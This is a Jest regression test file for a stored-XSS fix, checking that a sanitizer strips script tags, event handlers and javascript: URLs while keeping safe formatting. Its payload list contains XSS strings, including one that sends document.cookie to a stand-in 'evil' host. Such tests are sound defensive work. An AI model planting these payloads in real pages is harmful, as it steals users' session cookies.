import { describe, it, expect } from '@jest/globals';
import { sanitizeHTML, sanitizePlainText } from '../../server/utils/sanitizer.js';

/**
 * Regression tests for the stored-XSS fix. posts.description / blog content are
 * sanitized with sanitizeHTML before being persisted and later rendered via
 * dangerouslySetInnerHTML. These lock in that dangerous markup is stripped while
 * safe formatting survives.
 */
describe('XSS sanitization (sanitizeHTML)', () => {
  const payloads = [
    '<script>steal(document.cookie)</script>',
    '<img src=x onerror="fetch(\'//evil/?c=\'+document.cookie)">',
    '<a href="javascript:alert(1)">click</a>',
    '<svg/onload=alert(1)>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<body onload=alert(1)>',
    '<div onclick="alert(1)">x</div>',
    '<input onfocus=alert(1) autofocus>',
  ];

  for (const p of payloads) {
    it(`neutralizes: ${p.slice(0, 40)}`, () => {
      const out = sanitizeHTML(p);
      expect(out).not.toMatch(/<script/i);
      expect(out).not.toMatch(/onerror|onload|onclick|onfocus/i);
      expect(out).not.toMatch(/javascript:/i);
      expect(out).not.toMatch(/<iframe/i);
    });
  }

  it('keeps safe formatting tags', () => {
    const out = sanitizeHTML('<b>bold</b> <i>italic</i> <p>para</p> <ul><li>item</li></ul>');
    expect(out).toMatch(/<b>bold<\/b>/);
    expect(out).toMatch(/<i>italic<\/i>/);
    expect(out).toMatch(/<li>item<\/li>/);
  });

  it('sanitizePlainText strips all tags', () => {
    const out = sanitizePlainText('<b>hi</b><script>x()</script>');
    expect(out).not.toMatch(/[<>]/);
    expect(out).toContain('hi');
  });
});
